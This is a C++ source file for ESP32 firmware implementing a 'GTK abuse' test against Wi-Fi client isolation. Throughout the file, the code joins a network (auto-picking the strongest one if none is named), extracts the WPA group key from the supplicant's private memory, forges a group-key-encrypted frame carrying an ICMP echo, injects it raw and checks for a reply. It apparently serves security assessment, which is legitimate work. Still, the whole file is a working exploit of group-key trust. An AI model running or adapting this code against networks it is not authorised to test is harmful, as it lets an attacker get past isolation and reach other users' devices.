/**
 * @file gtk_abuse.cpp
 * @brief GTK Abuse Test - client isolation bypass via GTK injection
 */

#include "gtk_abuse.h"
#include <Arduino.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include "esp_netif.h"
#include "lwip/ip4_addr.h"
#include "lwip/sockets.h"
#include "lwip/inet.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <stdint.h>
#include <stddef.h>
#include <errno.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

#define PMK_LEN_MAX 64
#define WPA_NONCE_LEN 32
#define WPA_REPLAY_COUNTER_LEN 8
#define WPA_GTK_MAX_LEN 32
#define WPA_KCK_MAX_LEN 24
#define WPA_KEK_MAX_LEN 32
#define WPA_TK_MAX_LEN 32

enum key_flag {
  KEY_FLAG_MODIFY = 1 << 0,
  KEY_FLAG_DEFAULT = 1 << 1,
  KEY_FLAG_RX = 1 << 2,
  KEY_FLAG_TX = 1 << 3,
  KEY_FLAG_GROUP = 1 << 4,
  KEY_FLAG_PAIRWISE = 1 << 5,
  KEY_FLAG_PMK = 1 << 6,
};

enum { WIFI_WPA_ALG_CCMP = 3 };

extern "C" {
int esp_wifi_get_sta_key_internal(uint8_t *ifx, int *alg, u8 *addr, int *key_idx,
                                  u8 *key, size_t key_len, enum key_flag key_flag);
u8 *ccmp_encrypt(const u8 *tk, u8 *frame, size_t len, size_t hdrlen, u8 *pn, int keyid, size_t *encrypted_len);
}

struct wpa_ptk {
  u8 kck[WPA_KCK_MAX_LEN];
  u8 kek[WPA_KEK_MAX_LEN];
  u8 tk[WPA_TK_MAX_LEN];
  size_t kck_len;
  size_t kek_len;
  size_t tk_len;
  int installed;
};

struct wpa_gtk {
  u8 gtk[WPA_GTK_MAX_LEN];
  size_t gtk_len;
};

typedef struct {
  u8 pmk[PMK_LEN_MAX];
  size_t pmk_len;
  struct wpa_ptk ptk;
  struct wpa_ptk tptk;
  int ptk_set;
  int tptk_set;
  u8 snonce[WPA_NONCE_LEN];
  u8 anonce[WPA_NONCE_LEN];
  int renew_snonce;
  u8 rx_replay_counter[WPA_REPLAY_COUNTER_LEN];
  int rx_replay_counter_set;
  u8 request_counter[WPA_REPLAY_COUNTER_LEN];
  struct wpa_gtk gtk;
} gtk_wpa_sm_prefix_t;

struct wpa_sm;
extern struct wpa_sm gWpaSm;

static volatile bool gtk_abuse_running = false;
static TaskHandle_t gtk_abuse_task_handle = NULL;

typedef struct {
  uint8_t gtk[WPA_GTK_MAX_LEN];
  size_t gtk_len;
  uint8_t target_ap_bssid[6];
  uint8_t our_sta_mac[6];
  gtk_abuse_result_t result;
} gtk_abuse_ctx_t;

static gtk_abuse_ctx_t *gtk_ctx = NULL;
static gtk_abuse_result_t gtk_last_result = {0};

static bool wpa_ccmp_encrypt(const u8 *key, int key_len, const u8 *hdr, size_t hdr_len,
                             const u8 *plain, size_t plain_len, u8 *out, int *out_len, u64 pn) {
  if (key_len != 16 || hdr_len != 24) {
    return false;
  }

  uint8_t frame[128];
  size_t total = hdr_len + 8 + plain_len;
  if (total > sizeof(frame)) {
    return false;
  }

  memcpy(frame, hdr, hdr_len);
  memset(frame + hdr_len, 0, 8);
  memcpy(frame + hdr_len + 8, plain, plain_len);

  u8 pn_bytes[6];
  pn_bytes[0] = (u8)((pn >> 40) & 0xff);
  pn_bytes[1] = (u8)((pn >> 32) & 0xff);
  pn_bytes[2] = (u8)((pn >> 24) & 0xff);
  pn_bytes[3] = (u8)((pn >> 16) & 0xff);
  pn_bytes[4] = (u8)((pn >> 8) & 0xff);
  pn_bytes[5] = (u8)(pn & 0xff);

  size_t enc_len = 0;
  u8 *enc = ccmp_encrypt(key, frame, total, hdr_len, pn_bytes, 0, &enc_len);
  if (!enc) {
    return false;
  }
  memcpy(out, enc, enc_len);
  *out_len = (int)enc_len;
  free(enc);
  return true;
}

static void gtk_ctx_free(gtk_abuse_ctx_t *ctx) {
  if (!ctx) return;
  free(ctx);
}

static gtk_abuse_ctx_t *gtk_ctx_alloc(void) {
  return (gtk_abuse_ctx_t *)calloc(1, sizeof(gtk_abuse_ctx_t));
}

static bool get_our_ip_and_gw(char *ip_out, size_t ip_sz, char *gw_out, size_t gw_sz) {
  esp_netif_t *netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
  if (!netif) {
    netif = esp_netif_get_handle_from_ifkey("sta");
  }
  if (!netif) return false;

  esp_netif_ip_info_t ip_info;
  if (esp_netif_get_ip_info(netif, &ip_info) != ESP_OK) return false;

  ip4addr_ntoa_r((const ip4_addr_t *)&ip_info.ip, ip_out, ip_sz);
  if (gw_out && gw_sz > 0) {
    ip4addr_ntoa_r((const ip4_addr_t *)&ip_info.gw, gw_out, gw_sz);
  }
  return true;
}

static bool wait_for_ip(int timeout_sec) {
  Serial.println("GTK: Waiting for IP address...");
  char ip[16];
  for (int i = 0; i < timeout_sec * 10; i++) {
    if (get_our_ip_and_gw(ip, sizeof(ip), NULL, 0)) {
      Serial.printf("GTK: Got IP: %s\n", ip);
      return true;
    }
    vTaskDelay(pdMS_TO_TICKS(100));
  }
  return false;
}

static bool wait_for_gtk(int timeout_sec) {
  Serial.println("GTK: Waiting for supplicant to install GTK...");
  gtk_wpa_sm_prefix_t *sm = (gtk_wpa_sm_prefix_t *)&gWpaSm;
  for (int i = 0; i < timeout_sec * 10; i++) {
    if (sm->gtk.gtk_len > 0) {
      Serial.printf("GTK: Supplicant has GTK (%zu bytes)\n", sm->gtk.gtk_len);
      return true;
    }
    vTaskDelay(pdMS_TO_TICKS(100));
  }
  return false;
}

static bool extract_gtk_from_supplicant(gtk_abuse_ctx_t *ctx) {
  gtk_wpa_sm_prefix_t *sm = (gtk_wpa_sm_prefix_t *)&gWpaSm;
  if (sm->gtk.gtk_len == 0) {
    Serial.println("GTK: Supplicant has no GTK");
    return false;
  }
  ctx->gtk_len = sm->gtk.gtk_len;
  memcpy(ctx->gtk, sm->gtk.gtk, ctx->gtk_len);
  Serial.printf("GTK: Extracted GTK from supplicant (%zu bytes)\n", ctx->gtk_len);
  return true;
}

static bool validate_gtk_with_driver(gtk_abuse_ctx_t *ctx) {
  if (!ctx || ctx->gtk_len == 0 || ctx->gtk_len > WPA_GTK_MAX_LEN) {
    return false;
  }

  uint8_t ifx = WIFI_IF_STA;
  int alg = -1;
  int key_idx = -1;
  u8 addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
  u8 key[WPA_GTK_MAX_LEN] = {0};
  int rc = esp_wifi_get_sta_key_internal(&ifx, &alg, addr, &key_idx, key, sizeof(key),
                                         (enum key_flag)(KEY_FLAG_GROUP | KEY_FLAG_RX));
  if (rc != 0) {
    Serial.printf("GTK: Driver GTK validation failed to read key (rc=%d)\n", rc);
    ctx->result.gtk_validation_available = false;
    return false;
  }

  ctx->result.gtk_validation_available = true;
  bool key_match = memcmp(key, ctx->gtk, ctx->gtk_len) == 0;
  bool alg_ok = (alg == WIFI_WPA_ALG_CCMP);
  Serial.printf("GTK: Driver validation alg=%d idx=%d match=%s\n",
                alg, key_idx, key_match ? "YES" : "NO");
  return key_match && alg_ok;
}

static uint16_t checksum16(const void *data, size_t len) {
  const uint16_t *words = (const uint16_t *)data;
  uint32_t sum = 0;
  while (len > 1) {
    sum += *words++;
    len -= 2;
  }
  if (len > 0) {
    sum += *(const uint8_t *)words;
  }
  while (sum >> 16) {
    sum = (sum & 0xFFFF) + (sum >> 16);
  }
  return (uint16_t)(~sum);
}

static bool icmp_reply_matches(const uint8_t *buf, int len, uint16_t id, uint16_t seq) {
  const uint8_t *icmp = NULL;
  if (!buf || len < 8) return false;
  if (len >= 20 && (buf[0] >> 4) == 4) {
    int ip_hdr_len = (buf[0] & 0x0F) * 4;
    if (ip_hdr_len >= 20 && ip_hdr_len + 8 <= len) {
      icmp = buf + ip_hdr_len;
    }
  }
  if (!icmp) icmp = buf;
  uint8_t type = icmp[0];
  uint16_t recv_id = ((uint16_t)icmp[4] << 8) | icmp[5];
  uint16_t recv_seq = ((uint16_t)icmp[6] << 8) | icmp[7];
  return type == 0 && recv_id == id && recv_seq == seq;
}

static bool wait_for_icmp_reply(const char *target_ip, uint16_t id, uint16_t seq, int timeout_ms) {
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
  if (sock < 0) {
    Serial.printf("GTK: Failed to create ICMP socket: errno=%d\n", errno);
    return false;
  }

  struct timeval timeout;
  timeout.tv_sec = timeout_ms / 1000;
  timeout.tv_usec = (timeout_ms % 1000) * 1000;
  setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));

  struct in_addr expected_addr = {0};
  inet_aton(target_ip, &expected_addr);

  uint8_t recv_buf[256];
  struct sockaddr_in from = {0};
  socklen_t fromlen = sizeof(from);
  bool matched = false;

  for (;;) {
    int r = recvfrom(sock, recv_buf, sizeof(recv_buf), 0, (struct sockaddr *)&from, &fromlen);
    if (r <= 0) break;
    if (from.sin_addr.s_addr != expected_addr.s_addr) continue;
    if (icmp_reply_matches(recv_buf, r, id, seq)) {
      matched = true;
      break;
    }
  }

  close(sock);
  return matched;
}

static bool inject_gtk_test_frame(gtk_abuse_ctx_t *ctx, const char *target_ip, uint16_t *icmp_id_out,
                                  uint16_t *icmp_seq_out) {
  if (ctx->gtk_len != 16) {
    Serial.printf("GTK: Need 16-byte GTK for CCMP, got %zu\n", ctx->gtk_len);
    return false;
  }

  uint8_t mac_hdr[24];
  mac_hdr[0] = 0x08;
  mac_hdr[1] = 0x03;
  mac_hdr[2] = 0x00;
  mac_hdr[3] = 0x00;
  memcpy(mac_hdr + 4, ctx->target_ap_bssid, 6);
  memcpy(mac_hdr + 10, ctx->our_sta_mac, 6);
  memset(mac_hdr + 16, 0xFF, 6);
  mac_hdr[22] = 0x00;
  mac_hdr[23] = 0x00;

  uint8_t llc_snap[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x00};
  uint8_t ip_hdr[20];
  memset(ip_hdr, 0, 20);
  ip_hdr[0] = 0x45;
  ip_hdr[1] = 0x00;
  uint16_t total_len = 20 + 8;
  ip_hdr[2] = (total_len >> 8) & 0xFF;
  ip_hdr[3] = total_len & 0xFF;
  esp_fill_random(&ip_hdr[4], 2);
  ip_hdr[8] = 0x40;
  ip_hdr[9] = 0x01;

  char our_ip[16] = "192.168.1.1";
  get_our_ip_and_gw(our_ip, sizeof(our_ip), NULL, 0);
  ip4_addr_t src_ip, dst_ip;
  ip4addr_aton(our_ip, &src_ip);
  ip4addr_aton(target_ip, &dst_ip);
  memcpy(ip_hdr + 12, &src_ip, 4);
  memcpy(ip_hdr + 16, &dst_ip, 4);

  uint32_t sum = 0;
  for (int i = 0; i < 20; i += 2) {
    sum += (ip_hdr[i] << 8) | ip_hdr[i + 1];
  }
  while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
  ip_hdr[10] = (~sum >> 8) & 0xFF;
  ip_hdr[11] = ~sum & 0xFF;

  uint8_t icmp[8];
  memset(icmp, 0, 8);
  icmp[0] = 0x08;
  uint16_t icmp_id = (uint16_t)(esp_random() & 0xFFFF);
  uint16_t icmp_seq = (uint16_t)(esp_random() & 0xFFFF);
  icmp[4] = (uint8_t)(icmp_id >> 8);
  icmp[5] = (uint8_t)(icmp_id & 0xFF);
  icmp[6] = (uint8_t)(icmp_seq >> 8);
  icmp[7] = (uint8_t)(icmp_seq & 0xFF);
  uint16_t icmp_csum = checksum16(icmp, sizeof(icmp));
  icmp[2] = (uint8_t)(icmp_csum >> 8);
  icmp[3] = (uint8_t)(icmp_csum & 0xFF);

  uint8_t plain[36];
  memcpy(plain, llc_snap, 8);
  memcpy(plain + 8, ip_hdr, 20);
  memcpy(plain + 28, icmp, 8);

  uint8_t encrypted_frame[128];
  int encrypted_len = 0;
  uint64_t pn = esp_random() | ((uint64_t)esp_random() << 32);

  if (!wpa_ccmp_encrypt(ctx->gtk, (int)ctx->gtk_len, mac_hdr, 24,
                        plain, 36, encrypted_frame, &encrypted_len, pn)) {
    Serial.println("GTK: CCMP encryption failed");
    return false;
  }

  esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, encrypted_frame, encrypted_len, false);
  if (err != ESP_OK) {
    Serial.printf("GTK: Frame injection failed: %s\n", esp_err_to_name(err));
    return false;
  }

  if (icmp_id_out) *icmp_id_out = icmp_id;
  if (icmp_seq_out) *icmp_seq_out = icmp_seq;
  Serial.printf("GTK: Injected test frame to %s\n", target_ip);
  return true;
}

#define GTK_TASK_EXIT() do { \
  gtk_last_result = ctx->result; \
  gtk_ctx = NULL; \
  gtk_ctx_free(ctx); \
  gtk_abuse_running = false; \
  gtk_abuse_task_handle = NULL; \
  free(param); \
  vTaskDelete(NULL); \
  return; \
} while (0)

static void gtk_abuse_task(void *param) {
  char *args = (char *)param;
  char ssid[33] = {0};
  char password[65] = {0};

  char *sep = strchr(args, '\x1F');
  if (sep) {
    size_t ssid_len = (size_t)(sep - args);
    if (ssid_len >= sizeof(ssid)) ssid_len = sizeof(ssid) - 1;
    memcpy(ssid, args, ssid_len);
    ssid[ssid_len] = '\0';
    strncpy(password, sep + 1, sizeof(password) - 1);
  } else {
    strncpy(ssid, args, sizeof(ssid) - 1);
  }

  gtk_abuse_ctx_t *ctx = gtk_ctx_alloc();
  if (!ctx) {
    Serial.println("GTK Abuse: Failed to allocate context");
    gtk_abuse_running = false;
    gtk_abuse_task_handle = NULL;
    free(param);
    vTaskDelete(NULL);
    return;
  }
  gtk_ctx = ctx;

  WiFi.mode(WIFI_STA);
  WiFi.disconnect(false, true);

  if (ssid[0] == '\0') {
    int n = WiFi.scanNetworks(false, true);
    if (n <= 0) {
      Serial.println("GTK: No APs found");
      GTK_TASK_EXIT();
    }
    int best = 0;
    for (int i = 1; i < n; i++) {
      if (WiFi.RSSI(i) > WiFi.RSSI(best)) best = i;
    }
    strncpy(ssid, WiFi.SSID(best).c_str(), sizeof(ssid) - 1);
    WiFi.scanDelete();
    Serial.printf("GTK: Auto-selected AP %s\n", ssid);
  }

  Serial.printf("GTK Abuse Test: %s\n", ssid);
  strncpy(ctx->result.ssid, ssid, sizeof(ctx->result.ssid) - 1);
  esp_wifi_get_mac(WIFI_IF_STA, ctx->our_sta_mac);

  wifi_ap_record_t ap_info = {0};
  bool ap_found = false;
  int n = WiFi.scanNetworks(false, true);
  for (int i = 0; i < n; i++) {
    if (strncmp(WiFi.SSID(i).c_str(), ssid, sizeof(ap_info.ssid)) == 0) {
      memcpy(ap_info.bssid, WiFi.BSSID(i), 6);
      ap_info.primary = WiFi.channel(i);
      strncpy((char *)ap_info.ssid, WiFi.SSID(i).c_str(), 32);
      ap_found = true;
      memcpy(ctx->target_ap_bssid, ap_info.bssid, 6);
      break;
    }
  }
  WiFi.scanDelete();

  if (!ap_found) {
    Serial.printf("GTK: AP '%s' not found\n", ssid);
    GTK_TASK_EXIT();
  }

  Serial.printf("GTK: Connecting to %s...\n", ssid);
  WiFi.begin(ssid, password[0] ? password : NULL);

  if (!wait_for_ip(20)) {
    Serial.println("GTK: Failed to get IP address");
    GTK_TASK_EXIT();
  }

  ctx->result.connected = true;

  if (!wait_for_gtk(5)) {
    Serial.println("GTK: Supplicant did not install GTK in time");
    GTK_TASK_EXIT();
  }

  if (!extract_gtk_from_supplicant(ctx)) {
    Serial.println("GTK: Failed to extract GTK");
    GTK_TASK_EXIT();
  }

  ctx->result.gtk_validated = validate_gtk_with_driver(ctx);

  char our_ip[16], gw_ip[16];
  if (!get_our_ip_and_gw(our_ip, sizeof(our_ip), gw_ip, sizeof(gw_ip))) {
    Serial.println("GTK: Could not get IP info");
    GTK_TASK_EXIT();
  }

  Serial.printf("GTK: Our IP: %s, Gateway: %s\n", our_ip, gw_ip);
  ctx->result.gtk_derived = true;
  strncpy(ctx->result.our_ip, our_ip, sizeof(ctx->result.our_ip) - 1);
  strncpy(ctx->result.gateway_ip, gw_ip, sizeof(ctx->result.gateway_ip) - 1);

  uint16_t icmp_id = 0;
  uint16_t icmp_seq = 0;
  bool inject_ok = inject_gtk_test_frame(ctx, gw_ip, &icmp_id, &icmp_seq);
  ctx->result.frame_injected = inject_ok;
  if (inject_ok) {
    bool reply_ok = wait_for_icmp_reply(gw_ip, icmp_id, icmp_seq, 3000);
    ctx->result.reply_received = reply_ok;
    ctx->result.isolation_broken = reply_ok;
    if (reply_ok) {
      Serial.printf("GTK: Client isolation is BROKEN on this network.\n");
    } else {
      Serial.println("GTK: No echo reply received");
    }
  }

  GTK_TASK_EXIT();
}

#undef GTK_TASK_EXIT

extern "C" {

void gtk_abuse_start(const char *ssid, const char *password) {
  if (gtk_abuse_running) {
    Serial.println("GTK Abuse already running");
    return;
  }

  Serial.println("[GTK] start called");
  gtk_abuse_running = true;

  const char *use_ssid = ssid ? ssid : "";
  const char *use_pass = password ? password : "";
  size_t args_len = strlen(use_ssid) + strlen(use_pass) + 2;
  char *args = (char *)malloc(args_len);
  if (!args) {
    gtk_abuse_running = false;
    return;
  }
  snprintf(args, args_len, "%s\x1F%s", use_ssid, use_pass);

  Serial.println("[GTK] creating task");
  BaseType_t rc = xTaskCreate(gtk_abuse_task, "gtk_abuse", 8192, args, 5, &gtk_abuse_task_handle);
  if (rc != pdPASS) {
    Serial.println("GTK Abuse: Failed to start task");
    gtk_abuse_running = false;
    free(args);
    return;
  }
  Serial.println("[GTK] task created");
}

void gtk_abuse_stop(void) {
  gtk_abuse_running = false;
  vTaskDelay(pdMS_TO_TICKS(100));
  if (gtk_abuse_task_handle) {
    TaskHandle_t h = gtk_abuse_task_handle;
    gtk_abuse_task_handle = NULL;
    vTaskDelete(h);
  }
  if (gtk_ctx) {
    gtk_last_result = gtk_ctx->result;
    gtk_ctx_free(gtk_ctx);
    gtk_ctx = NULL;
  }
  WiFi.disconnect(true);
  Serial.println("GTK Abuse stopped");
}

bool gtk_abuse_is_running(void) {
  return gtk_abuse_running;
}

void gtk_abuse_display(void) {
  if (gtk_abuse_running && gtk_ctx) {
    gtk_abuse_ctx_t *ctx = gtk_ctx;
    Serial.println("GTK Abuse: Running");
    Serial.printf("  GTK derived: %s (%zu bytes)\n", ctx->gtk_len > 0 ? "YES" : "NO", ctx->gtk_len);
  } else {
    Serial.println("GTK Abuse: Not running");
  }
}

const gtk_abuse_result_t *gtk_abuse_get_result(void) {
  if (gtk_ctx) {
    return &gtk_ctx->result;
  }
  return &gtk_last_result;
}

} // extern "C"
